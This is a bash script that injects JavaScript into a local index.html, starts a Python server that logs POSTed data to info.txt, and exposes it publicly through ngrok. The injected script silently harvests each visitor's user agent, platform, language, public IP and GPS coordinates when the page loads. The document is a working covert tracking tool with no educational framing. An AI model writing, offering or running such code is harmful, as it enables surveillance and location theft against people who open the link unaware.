#!/bin/bash

# Check if ngrok is installed
if ! command -v ngrok &> /dev/null; then
    echo "Error: ngrok is not installed. Please install it first."
    exit 1
fi

# Check if Python is installed
if ! command -v python3 &> /dev/null; then
    echo "Error: Python3 is not installed. Please install it first."
    exit 1
fi

# Ensure the index.html file exists
HTML_FILE="index.html"
if [ ! -f "$HTML_FILE" ]; then
    echo "Error: $HTML_FILE not found in the current directory."
    exit 1
fi

# Backup the original HTML file
cp "$HTML_FILE" "${HTML_FILE}.bak"

# Inject JavaScript into index.html
echo "Injecting JavaScript into $HTML_FILE..."
sed -i '/<\/body>/i \
<script> \
async function gatherInfo() { \
    const data = { \
        userAgent: navigator.userAgent, \
        platform: navigator.platform, \
        language: navigator.language, \
        ip: await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(res => res.ip), \
    }; \
    if (navigator.geolocation) { \
        navigator.geolocation.getCurrentPosition( \
            position => { \
                data.location = { \
                    latitude: position.coords.latitude, \
                    longitude: position.coords.longitude \
                }; \
                sendData(data); \
            }, \
            error => { \
                console.error("Location access denied"); \
                sendData(data); \
            } \
        ); \
    } else { \
        console.error("Geolocation is not supported"); \
        sendData(data); \
    } \
} \
function sendData(data) { \
    fetch("/info", { \
        method: "POST", \
        headers: { "Content-Type": "application/json" }, \
        body: JSON.stringify(data) \
    }).then(() => console.log("Data sent")).catch(err => console.error(err)); \
} \
window.onload = gatherInfo; \
</script>' "$HTML_FILE"

# Create Python server script
SERVER_SCRIPT="server.py"
echo "Creating $SERVER_SCRIPT..."
cat <<EOF > "$SERVER_SCRIPT"
import http.server
import socketserver
import json

PORT = 8000

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/info":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            with open("info.txt", "a") as file:
                file.write(post_data.decode("utf-8") + "\\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Data received")
        else:
            self.send_response(404)
            self.end_headers()

handler = RequestHandler
httpd = socketserver.TCPServer(("", PORT), handler)

print(f"Serving on port {PORT}")
httpd.serve_forever()
EOF

# Start the Python server in the background
echo "Starting the local server..."
python3 "$SERVER_SCRIPT" &

# Store the Python process ID
PYTHON_PID=$!

# Start ngrok
echo "Starting ngrok..."
ngrok http 8000 &

# Store the ngrok process ID
NGROK_PID=$!

# Handle cleanup
trap "kill $PYTHON_PID $NGROK_PID; mv ${HTML_FILE}.bak $HTML_FILE; rm $SERVER_SCRIPT" EXIT

# Wait indefinitely
wait
